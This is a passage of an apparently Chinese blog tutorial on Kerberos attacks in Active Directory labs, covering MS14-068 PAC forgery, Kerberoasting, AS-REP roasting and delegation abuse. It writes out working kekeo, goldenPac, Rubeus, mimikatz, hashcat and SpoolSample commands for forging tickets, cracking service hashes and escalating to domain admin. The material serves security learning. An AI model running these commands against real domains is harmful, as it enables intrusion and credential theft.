AD-WIN2K-PAC 这个ad-type对应的ad-data就是一段连续空间。 这段空间包含一个头部PACTYPE以及若干个PAC_INFO_BUFFER 。<br>PACTYPE包含的是 cBuffers,版本以及缓冲区 。<br>PAC_INFO_BUFFER是key-value型的。PAC_INFO_BUFFER的key有很多</p><table><thead><tr><th>0x00000001</th><th>登录信息。PAC结构必须包含一个这种类型的缓冲区。其他登录信息缓冲区必须被忽略。</th></tr></thead><tbody><tr><td>0x00000002</td><td>凭证信息。PAC结构不应包含多个此类缓冲区。第二或后续凭证信息缓冲区在接收时必须被忽略。</td></tr><tr><td>0x00000006</td><td>服务器校验和。PAC结构必须包含一个这种类型的缓冲区。其他登录服务器校验和缓冲区必须被忽略。</td></tr><tr><td>0x00000007</td><td>KDC（特权服务器）校验和（第2.8节）。PAC结构必须包含一个这种类型的缓冲区。附加的KDC校验和缓冲区必须被忽略。</td></tr><tr><td>0x0000000A</td><td>客户名称和票证信息。PAC结构必须包含一个这种类型的缓冲区。附加的客户和票据信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000B</td><td>受约束的委派信息。PAC结构必须包含一个S4U2proxy请求的此类缓冲区，否则不包含。附加的受约束的委托信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000C</td><td>用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个这种类型的缓冲区。接收时必须忽略第二个或后续的UPN和DNS信息缓冲区。</td></tr><tr><td>0x0000000D</td><td>客户索取信息。PAC结构不应包含多个这种类型的缓冲区。附加的客户要求信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000E</td><td>设备信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000F</td><td>设备声明信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备声明信息缓冲区必须被忽略。</td></tr></tbody></table><p>其中比较重要的是1,6和7</p><p><strong>0x00000001 KERBVALIDATIONINFO</strong> 这个结构用于存储用户的身份信息.它是一个结构体，这个结构体是这样的(待会我们伪造PAC的时候主要就是伪造此处额 UserId 以及 PGROUP_MEMBERSHIP GroupIds ）服务器解包PAC后提取用户的sid以及groupid，然后就把当前发包过来的用户权限当成sid，groupid的权限处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _KERB_VALIDATION_INFO &#123;</span><br><span class="line">FILETIME LogonTime;</span><br><span class="line">FILETIME LogoffTime;</span><br><span class="line">FILETIME KickOffTime;</span><br><span class="line">FILETIME PasswordLastSet;</span><br><span class="line">FILETIME PasswordCanChange;</span><br><span class="line">FILETIME PasswordMustChange;</span><br><span class="line">RPC_UNICODE_STRING EffectiveName;</span><br><span class="line">RPC_UNICODE_STRING FullName;</span><br><span class="line">RPC_UNICODE_STRING LogonScript;</span><br><span class="line">RPC_UNICODE_STRING ProfilePath;</span><br><span class="line">RPC_UNICODE_STRING HomeDirectory;</span><br><span class="line">RPC_UNICODE_STRING HomeDirectoryDrive;</span><br><span class="line">USHORT LogonCount;</span><br><span class="line">USHORT BadPasswordCount;</span><br><span class="line">ULONG UserId; &#x2F;&#x2F;用户的sid</span><br><span class="line">ULONG PrimaryGroupId;</span><br><span class="line">ULONG GroupCount;</span><br><span class="line">[size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;&#x2F;&#x2F;用户所在的组，如果我们可以篡改的这个的话，添加一个500(域管组)，那用户就是域管了。在ms14068 PAC签名被绕过，用户可以自己制作PAC的情况底下，pykek就是靠向这个地方写进域管组，成为使得改用户变成域管</span><br><span class="line">ULONG UserFlags;</span><br><span class="line">USER_SESSION_KEY UserSessionKey;</span><br><span class="line">RPC_UNICODE_STRING LogonServer;</span><br><span class="line">RPC_UNICODE_STRING LogonDomainName;</span><br><span class="line">PISID LogonDomainId;</span><br><span class="line">ULONG Reserved1[2];</span><br><span class="line">ULONG UserAccountControl;</span><br><span class="line">ULONG SubAuthStatus;</span><br><span class="line">FILETIME LastSuccessfulILogon;</span><br><span class="line">FILETIME LastFailedILogon;</span><br><span class="line">ULONG FailedILogonCount;</span><br><span class="line">ULONG Reserved3;</span><br><span class="line">ULONG SidCount;</span><br><span class="line">[size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;</span><br><span class="line">PISID ResourceGroupDomainSid;</span><br><span class="line">ULONG ResourceGroupCount;</span><br><span class="line">[size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;</span><br><span class="line">&#125; KERB_VALIDATION_INFO;</span><br></pre></td></tr></table></figure><p><strong>0x00000006和0x00000007</strong> 6是服务器校验和，由server密码加密。7是KDC校验和，又KDC密码加密。存在的目的就是防止PAC被篡改。</p><h3 id="MS14068"><a href="#MS14068" class="headerlink" title="MS14068"></a>MS14068</h3><p>这个漏洞的产生主要是微软犯下了三个错误：<br>1.对校验和的算法实现不够细致，导致在校验和生成时可以不用管server和KDC的hash直接生成，而且生成出来的校验和还是合法的<br>2.PAC可以不用放在TGT中，即使是这样，KDC也能照常解析出TGT外的PAC<br>3.下面再说</p><p>那么这个漏洞大致的攻击原理是什么呢。<br>首先，我们在as_request的时候，把include-PAC标志设置为false，那么as_rep就不会在TGT中返回PAC了。然后这个时候我们自己伪造一个pac，在TGS_REQ时发过去就行了。伪造的pac修改USER SID&amp;GROUP SID(在PAC的 <strong>0x00000001 KERBVALIDATIONINFO</strong> 结构)可以把我们的用户权限改到很高（域管），从而达到提权到域管的能力。</p><p>那么伪造PAC，我们就遇到了两个问题：<br>1.pac里有校验和，防止自己被篡改，我们得有server和KDC密码才能使校验和合法。<br>2.pac按理说应该在TGT里，但是TGT是被kbrtgt hash加密的，我们无法获取kbrtgt hash继而无法修改TGT内容，继而不能修改PAC。</p><p>来说说如何绕过PAC校验和问题。<br>我们刚刚说过，<strong>0x00000006和0x00000007</strong> 这两个结构的存在是为了防止PAC被篡改，这个校验和算法采用的是个叫checksum算法然后把kdc hash和服务hash当作key对PAC加密产生的值，从而防止PAC被篡改。但是checksum算法是有很多种的，md5也是checksum的分支之一，修改PAC后，我们只需设置加密算法为MD5并用MD5算法对<strong>0x00000001 KERBVALIDATIONINFO</strong>进行加密，将生成的值放入两个检验和即可，KDC拿到<strong>0x00000001 KERBVALIDATIONINFO</strong>，并且通过解析数据包获取当前加密算法为MD5，然后对其进行MD5加密，若加密结果与校验和一致，则认为PAC未被修改</p><p>再来说说如何绕过krbtgt hash加密TGT的问题。<br>因为我们在AS_REQ时设置include-PAC为false，TGT里就不会包含PAC了。那么我们在TGS_REQ时如何把PAC传递给KDC？只需要把PAC放入req-body即可。<br>这样KDC依旧会正常解析这个TGS_REQ包</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132156.png" alt="QQ截图20210217132156"></p><p>注意TGS_REQ里的include-pac依旧是false。<br><strong>然后KDC接收到PAC后会先解密TGT拿到authenticator里的key对PAC进行解密（TGS_REQ时加密PAC用的key是随机生成的，这个key会放在authenticator里），然后验证一下PAC的签名，若成功然后把解密得到的PAC采用server key和KDC key重新生成校验和，拼接成一个新的TGT返回给客户端。</strong><br>上面这一段就是微软犯下的第三个错误，很不可思议，居然莫名其妙的返回了一个包含了PAC的TGT回来。总结来说就是构造了一个畸形的TGS_REQ，从TGS_RES得到了一个包含伪造PAC的TGT。</p><p>原理就是上面这些，然后我们用包含伪造PAC的TGT到处访问服务即可。</p><h3 id="M14068利用"><a href="#M14068利用" class="headerlink" title="M14068利用"></a>M14068利用</h3><p>1.工具kekeo<a href="https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718"> https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718</a></p><p>具体方法为，在kekeo里先执行 kerberos::purge清空票据<br>然后再执行 exploit::ms14068 /user:xxx /password:xxx /domain:xxx /ptt<br>即可。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132222.png" alt="QQ截图20210217132222"></p><p>然后就dir \域控\c$ 试试，如果可以就说明提权成功了（不是每次都能成功的)</p><p>2.golenpac <a href="https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe">https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe</a></p><p>这个工具好用,</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132233.png" alt="QQ截图20210217132233"></p><p>执行类似上述命令，就能返回一个域控的 system权限的cmd shell回来，感觉蛮好用<br>另外在最后指定域控机器时，可以指定域控以外的机器并获取他们的本地system权限用户.<br>但返回的似乎不是域控？</p><h2 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a>kerberoast</h2><p>Kerberoast攻击原理: 攻击者从 TGS-REP 中提取加密的服务票证。 由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码</p><h3 id="How-to-get-SPN"><a href="#How-to-get-SPN" class="headerlink" title="How to get SPN"></a>How to get SPN</h3><p>如何得到域中的所有SPN？</p><p><strong>1.setspn</strong><br>很简单，只需执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -q *&#x2F;*</span><br></pre></td></tr></table></figure><p>即可</p><p><strong>2.kerberoast工具集的GetUserSpns powershell脚本</strong></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132445.png" alt="QQ截图20210217132445"></p><h3 id="How-to-get-HASH"><a href="#How-to-get-HASH" class="headerlink" title="How to get HASH"></a>How to get HASH</h3><p>如何得到hash？<br>有如下方法</p><p><strong>1.Rubeus.exe</strong></p><p>这个工具github上就有，但是clone下来后需要自己编译成exe.</p><p>然后执行 Rubeus.exe kerberoast指令即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132502.png" alt="QQ截图20210217132502"></p><p><strong>2.mimikatz</strong></p><p>mimikatz真的神器。<br>通过命令 kerberos::ask /target:你所指定的SPN,</p><p><img src="http://www.const27.com/wp-content/uploads/2020/09/image-33.png" alt="img"></p><p>即可通过认证的方式得到一个ST。<br>然后我们在kerberos::list里可以看到我们想要的ST</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132529.png" alt="QQ截图20210217132529"></p><p><strong>3.powershell</strong></p><p>越来越发现powershell在域渗透中的重要性了<br>输入以下指令，即可完成HASH获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MySQL&#x2F;win7.xie.com:3306&#x2F;MySQL&quot;</span><br></pre></td></tr></table></figure><p>然后mimikatz导出即可</p><h3 id="How-to-export-hash"><a href="#How-to-export-hash" class="headerlink" title="How to export hash"></a>How to export hash</h3><p>获得了ST票据，但怎么导出？</p><p><strong>1.mimikatz</strong></p><p>导出所有票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132544.png" alt="QQ截图20210217132544"></p><p>可以发现生成了kirbi文件。这就是我们所需要的hash了</p><p><strong>2.Empire Powershell 框架</strong></p><p>github:<a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p><p>我们通过这个框架可以导出hashcat格式的hash.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132627.png" alt="QQ截图20210217132627"></p><h3 id="How-to-crack-HASH"><a href="#How-to-crack-HASH" class="headerlink" title="How to crack HASH"></a>How to crack HASH</h3><p>如何破解HASH?</p><p><strong>1.HASHCAT</strong></p><p>这个工具需要让hash格式为hashcat模式才能进行破解。kribi文件不能放入hashcat进行破解.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13110 pass.txt hash.txt</span><br></pre></td></tr></table></figure><p><strong>2.kerberoast中的tgsrepcrack.py</strong></p><p>支持kribi文件破解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 tgsrepcrack.py pass.txt xxx.kribi</span><br></pre></td></tr></table></figure><h3 id="How-to-use-Kerberoast"><a href="#How-to-use-Kerberoast" class="headerlink" title="How to use Kerberoast"></a>How to use Kerberoast</h3><p>既然我们都把ST的加密hash都破解了，那么我们就可以随便改ST中的票据内容了..\ 这里使用的是kerberoast工具集里的kerberoast.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500</span><br><span class="line">python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512</span><br><span class="line">## 将票据权限改为administrator</span><br><span class="line">kerberos::ptt PENTESTLAB.kirbi  #将票据注入到内存</span><br></pre></td></tr></table></figure><h2 id="AS-REP-Roast"><a href="#AS-REP-Roast" class="headerlink" title="AS_REP Roast"></a>AS_REP Roast</h2><p>较Kerberoast来说，比较鸡肋。<br>它的原理是在不开启kerberos预身份验证的前提下，获得其他用户的AS_RES，并破解加密session key 的 client hash。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132642.png" alt="QQ截图20210217132642"></p><h3 id="How-to-get-HASH-1"><a href="#How-to-get-HASH-1" class="headerlink" title="How to get HASH"></a>How to get HASH</h3><p><strong>1.Rubeus</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast</span><br></pre></td></tr></table></figure><p>然后就会搜索域中不需要kerberos预验证的用户，并获得ASREP。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132654.png" alt="QQ截图20210217132654"></p><p><strong>2.Empire框架与 ASREPRoast.ps1</strong></p><p>使用Empire框架下的powerview.ps1查找域中设置了 “不需要kerberos预身份验证” 的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line"> Get-DomainUser -PreauthNotRequired</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132707.png" alt="QQ截图20210217132707">然后用 ASREPRoast.ps1 ：<a href="https://github.com/HarmJ0y/ASREPRoast">https://github.com/HarmJ0y/ASREPRoast</a> 获取指定用户的AS-REPhash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -USER xx -Domain xx |Out-file -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure><p><img src="http://www.const27.com/wp-content/uploads/2020/09/image-41.png" alt="img"></p><p>就会生成一个hash数据文件了</p><h3 id="How-to-crack-hash"><a href="#How-to-crack-hash" class="headerlink" title="How to crack hash"></a>How to crack hash</h3><p>将生成的HASH保存起来，并在下图处加入$23</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132743.png" alt="QQ截图20210217132743"></p><p>然后丢给hashcat 跑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt pass.txt</span><br></pre></td></tr></table></figure><p>注意这里的pass.txt是自己的明文字典…之前我还一直以为是爆破出来的结果.<br>原来是一个一个的用明文字典去爆破。</p><h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><h3 id="域委派"><a href="#域委派" class="headerlink" title="域委派"></a>域委派</h3><p>域委派是一种域内主机的行为，使某个服务可以以访问的用户的身份去访问另外一个服务。<br>为什么需要域委派呢，比如现在有web服务器和文件服务器，当用户A访问web服务器去请求某个资源时，web服务器上本身并没有该资源，所以web服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：<br>用户A访问web服务器，服务器再以用户A的身份去访问文件服务器。<br>发生域委派的服务一般为机器账户和服务账户。<br>域委派分为三种：非约束性委派，约束性委派，基于资源的约束性委派</p><h4 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h4><p>非约束性委派的原理是：用户想访问服务A，于是向KDC提交认证，KDC发现A是非约束性委派，于是会把TGT放在ST中一并给用户。然后用户用这个ST去访问服务A，服务A就相当于获得了用户的TGT，把TGT放入lsass进程，然后就可以拿着用户的TGT以用户的身份去访问所有用户权限能够访问的服务了。</p><p>非约束性委派的启用：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134709.png" alt="QQ截图20210217134709"></p><p>为某账户启用 信任此计算机来委派任何服务 即开启非约束性委派。<br>开启后在该用户的 ACL属性会多出一个 flag : WORKSTATION_TRUSTED_FOR_DELEGATION (图截不完，反正这个flag就在箭头所指处的后面)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134749.png" alt="QQ截图20210217134749"></p><p>非约束委派的设置需要<code>SeEnableDelegation</code> 特权，该特权通常仅授予域管理员<br>这里说个题外话，域控主机默认是非约束性委派</p><h4 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h4><p>非约束性委派是很不安全的（因为控制了开启非约束性委派的机器，就相当于获得了上面的所有其他用户的TGT），所以更安全的约束性委派诞生了。<br>约束性委派多了两个委派协议，S4U2SELF S4U2PROXY，并且限制了被设置委派的服务的访问范围：仅能被委派到被指定的服务。</p><p>约束性委派的大致流程：<br>用户访问开启约束性委派的服务A<br>（情况一：无S4U2SELF参与）首先需要经过KDC认证，KDC发现服务A开启了约束性委派，于是在TGS_RES返回给用户ST1（可转发ST），用户拿着ST1访问服务A，服务A先与KDC进行身份验证获得一个有效TGT，然后拿着ST1经过S4U2PROXY协议向KDC发起TGS_REQ，KDC返回ST2（用户身份的ST），然后服务A拿着ST2访问指定服务。<br>（情况二：有S4U2SELF参与）用户通过其他方式（如NTLM认证，表单认证等）获取了服务A的信任，但是此时服务A并没有来自用户的ST1，按情况一中的流程，服务A就不能完成委派。所以这个时候服务A会以自己的身份向KDC发起申请获取一个可转发TGT（获取KDC信任），然后用这个TGT发起TGS_REQ获得指定用户的ST1，既然获取了ST1，就继续情况一中的流程即可了。</p><p>也就是说S4U2SELF是用户通过非kerberos协议完成认证的情况下，自动向KDC获取ST1的一个协议。<br>而S4U2PROXY则是将ST1发给KDC，使其变现为成自己可用的 ST2 的一个协议。</p><p>启用方法:</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135048.png" alt="QQ截图20210217135048"></p><p>其中被添加的服务则是允许被委派到的服务</p><p>若启用的是 仅使用kerberos，那么useraccountcontrol属性仅有 workstation_trust_account.<br>若启用任何身份验证协议，就会有 TrustedToAuthenticationForDelegation</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135100.png" alt="QQ截图20210217135100"></p><h4 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h4><p>Windows Server 2012中引入了基于资源的约束性委派。 只能在运行Windows Server 2012或Windows Server 2012 R2及以上的域控制器上配置<br>基于资源的约束性委派，不需要域管理员前来设置，而把设置委派的权限交给了自身。<br>其实就是可以摆脱域控来主动设置自己可以被哪些账户委派访问。</p><h3 id="非约束性委派攻击"><a href="#非约束性委派攻击" class="headerlink" title="非约束性委派攻击"></a>非约束性委派攻击</h3><p>非约束性委派有巨大的安全问题，上面我们说过，非约束性委派的实质就是把用户的TGT存入lassa进程，从而模拟用户身份进行各种委派访问，所以我们只需控制非约束性委派攻击的机器，然后dump出所有的票据，就相当于获得了所有经过该服务进行约束性委派的用户的身份了。</p><h4 id="1-进行非约束性委派账户扫描"><a href="#1-进行非约束性委派账户扫描" class="headerlink" title="1.进行非约束性委派账户扫描"></a>1.进行非约束性委派账户扫描</h4><p>这里提一下怎么创建有SPN的服务账户。<br>只需再域控里执行 setspn -U -A spn_type username 即可<br>其中spn_type即SPN的格式： MSSQLSvc/<FQDN>:[<port> | <instancename>]</p><ul><li><strong>MSSQLSvc</strong> 是要注册的服务。</li><li><FQDN> 是服务器的完全限定域名。</li><li><port> 是 TCP 端口号。</li><li><instancename> 是 SQL Server 实例的名称。</li></ul><p>这里我们随便输一个，比如 sb/caonima 这种都行.</p><p>这里采用powersploit下的powerview.ps1<br>根据我网上很多搜索结果，查找非约束委派服务账户只需调用<br><code>Get-NetUser -Unconstrained -Domain de1ay.com</code><br>这个命令即可，但是我下载下来的powerview里的get-netuser里却没有unconstrained参数，很烦。所以用一个比较原始的方法来判别（适合在用户少的情况下）<br>直接调用 Get-NetUser -SPN 找到所有服务账户或者Get-domaincomputer找到所有机器账户，然后判断其useraccountcontrl里有没有trusted_for_delegation,若有，则说明开启了非约束性委派</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135123.png" alt="QQ截图20210217135123"></p><p>查询非约束委派机器账户则用<br><code>Get-domaincomputer -unconstrained -domain const.com</code></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135236.png" alt="QQ截图20210217135236"></p><h4 id="2-非约束性委派的攻击"><a href="#2-非约束性委派的攻击" class="headerlink" title="2.非约束性委派的攻击"></a>2.非约束性委派的攻击</h4><p>仅能基于机器账户</p><p>如果我们获得了一个非约束性委派账户，我们就可以通过收集内存中的tgt达到任意用户访问的目的。</p><p>在被控制的非约束性委派机器上使用mimikatz。<br><code>privilege::debug</code>提权<br><code>sekurlsa::tickets</code> 查看本机所有票据</p><p>通过以上命令获取票据,如果管理员访问了本机的一些服务，那么它的TGT就会被截获放入内存。</p><p>我们模拟管理员调用非约束性委派机的smb服务</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135342.png" alt="QQ截图20210217135342"></p><p>我们回到非约束委派机，查看票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135358.png" alt="QQ截图20210217135358"></p><p>tgt被截获,我们用 sekurlas::tickets /export 把票据导出来</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135408.png" alt="QQ截图20210217135408"></p><p>然后mimikatz里使用<br><code>kerberos::ptt 票据文件名 将票据注入内存</code><br>访问域控c$</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135419.png" alt="QQ截图20210217135419"></p><p>成功</p><h4 id="3-非约束性委派配合-Spooler打印机服务"><a href="#3-非约束性委派配合-Spooler打印机服务" class="headerlink" title="3.非约束性委派配合 Spooler打印机服务"></a>3.非约束性委派配合 Spooler打印机服务</h4><p>纯非约束性委派攻击很鸡肋，因为必须要其他用户通过你进行委派访问。<br>但是 ：利用Windows打印系统远程协议<code>（MS-RPRN）</code>中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>方法强制任何运行了<code>Spooler</code>服务的计算机以通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。 配合非约束性委派攻击，简直爆炸，可以主动拿到其他用户的TGT。-<br>而且splooer服务是默认运行的。（图源WIN7）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135445.png" alt="QQ截图20210217135445"></p><p>使其他主机强行与自己发生身份验证的脚本：需要自己编译一下<a href="https://github.com/leechristensen/SpoolSample.git">https://github.com/leechristensen/SpoolSample.git</a></p><p>在此之前需要开启监听来自其他主机的TGT，这里用的是rubeus<br><code>Rubeus.exe monitor /interval:1 /filteruser:xx</code></p><p>然后使用<code>SpoolSample.exe XX win7</code>,让指定机器访问WIN7进行身份验证</p><p>然后获得TGT，下班。</p><h3 id="约束性委派的攻击"><a href="#约束性委派的攻击" class="headerlink" title="约束性委派的攻击"></a>约束性委派的攻击</h3><p>约束性委派的大致攻击流程是: (利用S4U2SELF=&gt;)如果我们获得了约束性委派机的NTLM hash或者明文密码，我们就可以以此来向KDC发送一个TGT申请，获得一个可转发的TGT。然后用这个可转发的TGT调用S4U2SELF协议，获得一个针对自己的ST1票据（其中ST1票据中的请求用户可以任意伪造）.然后用这个ST1票据去向KDC请求ST2，然后用ST2去访问服务，此时我们访问的身份就是我们任意伪造的身份了.</p><p>重点是只要获得了可转发TGT，约束性委派机就可以任意伪造其他用户的ST1票据请求，太可怕了。</p><p>这个攻击的最大前提是我们得获得约束性委派账户的NTLM HASH或者明文密码,然后我们才能成功的得到可转发TGT，然后才能得到接下来的一切。</p><p>首先配置好约束性委派账户</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135527.png" alt="QQ截图20210217135527"></p><p>注意选用 使用任何身份验证协议</p><p>我们先信息搜集：看哪些用户是开启约束性委派的。一手powerview安排上</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135553.png" alt="QQ截图20210217135553"></p><p>箭头指出的地方就是可以被委派访问的服务</p><p>我们用kekeo来实现攻击.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask &#x2F;user:xx &#x2F;domain:xx &#x2F;password:xx &#x2F;ticket:test.kirbi这里的&#x2F;password可以改成&#x2F;NTLM:xx</span><br><span class="line">获得TGT转发票据</span><br><span class="line"></span><br><span class="line">tgs::s4u &#x2F;tgt:file_name &#x2F;user:administrator &#x2F;service:cifs&#x2F;DC</span><br><span class="line">tgt处改为刚刚得到的TGT文件的名字，这个命令执行后得到administrator身份的 ST2</span><br></pre></td></tr></table></figure><p>把最后获得的票据用mimikatz kerberos::ptt 注入内存，完事。</p><h3 id="基于资源的约束性委派-1"><a href="#基于资源的约束性委派-1" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h3><p>refer:<a href="https://xz.aliyun.com/t/7454">https://xz.aliyun.com/t/7454</a></p><h4 id="原理的几个点："><a href="#原理的几个点：" class="headerlink" title="原理的几个点："></a>原理的几个点：</h4><p>1.S4U2SELF 协议可以在用户没有配置 TrustedToAuthenticationForDelegation 属性（即开启使用任何协议认证的约束性委派）时被调用，但是返回的ST是不可被转发的。<br>2.基于资源的约束性委派主机 在被另一台主机委派访问时，在S4U2PROXY过程中提交过来的ST如果即使是不可转发的。KDC依旧会返回有效的ST2。<br>3.每个普通域用户默认可以创建至多十个机器账户（ 由MachineAccountQuota属性决定 ），每个机器账户被创建时都会自动注册SPN: <code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN</p><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程:"></a>攻击流程:</h4><p>假设开启基于资源的约束性委派机器为A<br>1.首先要有一个对当前计算机有写权限的账户，才能对A设置可以 被 委派访问的服务账户。<br>2.利用当前账户创建一个机器账户，并配置好机器账户到A的 基于资源的约束性委派<br>3.因为机器账户是我们创建的，我们知道他的密码账户，可以让它利用S4U2SELF协议获得一个不可转发ST。然后用这个不可转发ST通过S4U2PROXY，在基于资源的约束性委派基础上获得有效的访问A cifs服务的ST2。<br>4.用ST2访问A的CIFS服务，权限获得。</p><h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>这个攻击说白了就是个提权…</p><p>首先我们检查一下域控是否是win2012以上的主机，因为只有这样才能开启 